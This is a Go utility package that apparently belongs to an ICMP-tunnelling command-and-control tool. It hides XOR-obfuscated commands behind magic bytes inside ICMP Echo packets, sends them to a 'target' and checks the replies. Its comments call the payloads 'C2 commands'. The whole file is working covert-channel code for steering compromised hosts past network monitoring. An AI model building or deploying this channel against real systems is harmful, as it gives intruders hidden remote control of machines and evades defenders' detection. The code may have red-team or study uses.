package utils

import (
	"bytes"
	"fmt"
	"net"
	"os"
	"time"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

type NoMagicError string
type WrongICMPTypeError string
type WrongReplyIPError struct {
	SrcAddr  net.Addr
	TargetIP net.IP
}
type WrongReplyCommandError struct {
	Sent     string
	Received string
}
type IncompleteSendError struct {
	Sent  int
	Total int
}

func (e NoMagicError) Error() string {
	return string(e)
}
func (e WrongICMPTypeError) Error() string {
	return string(e)
}
func (e WrongReplyIPError) Error() string {
	return fmt.Sprintf("packet received by non-target: wanted '%s', got '%s'", e.TargetIP.String(), e.SrcAddr.String())
}
func (e WrongReplyCommandError) Error() string {
	return fmt.Sprintf("wrong reply received: wanted '%s', got '%s'", e.Sent, e.Received)
}
func (e IncompleteSendError) Error() string {
	return fmt.Sprintf("didn't send enough bytes: sent %v of %v", e.Sent, e.Total)
}

const (
	ProtocolICMP = 1 // from golang.org/x/net/internal/iana, can't import Golang internal packages

	ErrNoMagic       = NoMagicError("packet does not contain magic")
	ErrWrongICMPType = WrongICMPTypeError("packet has unexpected ICMP type")
)

// These can be changes to whatever you want
var (
	magicBytes = []byte{0x59, 0x41, 0x02}
	xorKey     = []byte{0x14, 0x23}
)

/*
	Returns the decrypted message (C2 command) contained in the ICMP request.
*/
func GetICMPData(conn net.PacketConn) ([]byte, icmp.Type, net.Addr, error) {
	// Read ICMP message from packet
	var icmpRaw []byte = make([]byte, 1500)
	var icmpMsg *icmp.Message
	var icmpBody []byte
	var size int
	var srcAddr net.Addr

	// Get raw packet bytes
	size, srcAddr, err := conn.ReadFrom(icmpRaw)
	if err != nil {
		return nil, nil, nil, err
	}

	// Structure data
	icmpMsg, err = icmp.ParseMessage(ProtocolICMP, icmpRaw[:size])
	if err != nil {
		return nil, nil, srcAddr, err
	}

	// Get bytes from packet body
	icmpBody, err = icmpMsg.Body.Marshal(ProtocolICMP)
	if err != nil {
		return nil, icmpMsg.Type, srcAddr, err
	}

	return icmpBody, icmpMsg.Type, srcAddr, nil
}

/*
	Send a command to the target.

	Resource: Simple utility package to send ICMP pings with Go - https://gist.github.com/lmas/c13d1c9de3b2224f9c26435eb56e6ef3
*/
func SendICMPData(conn net.PacketConn, target net.Addr, data []byte) (time.Time, error) {
	// Encrypt command
	encryptedData := XorEncryptDecryptBytes(data, xorKey)

	// Craft the ICMP message
	icmpMsg := icmp.Message{
		Type: ipv4.ICMPTypeEcho, Code: 0,
		Body: &icmp.Echo{
			ID: os.Getpid() & 0xffff, Seq: 1,
			Data: append(magicBytes, encryptedData...),
		},
	}
	icmpRaw, err := icmpMsg.Marshal(nil)
	if err != nil {
		return time.Time{}, err
	}

	// Send it
	startTime := time.Now()
	err = conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	if err != nil {
		return startTime, err
	}
	numSentBytes, err := conn.WriteTo(icmpRaw, target)
	if err != nil {
		return startTime, err
	} else if numSentBytes != len(icmpRaw) {
		return startTime, &IncompleteSendError{Sent: numSentBytes, Total: len(icmpRaw)}
	}

	return startTime, nil
}

/*
	Ensure we receive an Echo Reply to confirm that the data has been received
	on the other end.

	Returns an error if data could not be received or if an error occurred
	while processing the Echo Reply. Otherwise, nil.
*/
func ICMPDataReceived(conn net.PacketConn, target net.IP, sentData []byte) error {
	errDeadline := conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	if errDeadline != nil {
		return errDeadline
	}

	rawReply, icmpType, srcAddr, err := GetICMPData(conn)
	errDeadline = conn.SetReadDeadline(time.Time{}) // unset read deadline
	if err != nil {
		return err
	}
	if errDeadline != nil {
		return errDeadline
	}

	// Check that this is an ICMP Echo Reply, not a different type of ICMP packet
	if icmpType != ipv4.ICMPTypeEchoReply {
		return ErrWrongICMPType
	}

	// Note: DecryptContent also strips off the magic bytes, so making a
	// comparison between rawReply and sentData would be incorrect.
	decryptedReply, err := DecryptContent(rawReply)
	if err != nil {
		return err
	}

	// Check that the message we sent is the same message in the Echo Reply
	if !bytes.Equal(sentData, decryptedReply) {
		return &WrongReplyCommandError{Sent: string(sentData), Received: string(decryptedReply)}
	}

	// Validate other generic conditions
	if err = ValidateICMPPacket(srcAddr, target); err != nil {
		return err
	}

	return nil
}

func DecryptContent(rawContent []byte) ([]byte, error) {
	// Check for magic bytes: "<...> <magic> COMMAND"
	var decryptedContent []byte

	if bytes.Contains(rawContent, magicBytes) {
		decryptedContent = XorEncryptDecryptBytes(bytes.Split(rawContent, magicBytes)[1], xorKey)
	} else {
		return nil, ErrNoMagic
	}

	return decryptedContent, nil
}

func ValidateICMPPacket(srcAddr net.Addr, dstIP net.IP) error {
	// Check that we're receiving the packet from our target and not another IP
	if srcAddr.String() != dstIP.String() {
		return &WrongReplyIPError{SrcAddr: srcAddr, TargetIP: dstIP}
	}

	// More checks as necessary
	// ...

	return nil
}
